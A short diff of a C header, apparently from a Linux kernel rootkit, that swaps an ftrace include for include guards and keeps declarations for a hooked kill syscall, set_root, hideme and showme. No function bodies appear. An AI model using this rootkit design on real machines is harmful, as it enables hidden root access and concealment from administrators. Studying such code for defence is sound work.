@@ -1,6 +1,5 @@
-#include "ftrace_hook.h"
-
-
+#ifndef KILL_HEADER
+#define KILL_HEADER
 #include <linux/string.h>
 
 
@@ -21,3 +20,5 @@ asmlinkage int hook_kill(const struct pt_regs *regs);
 void set_root(void);
 void showme(void);
 void hideme(void);
+
+#endif
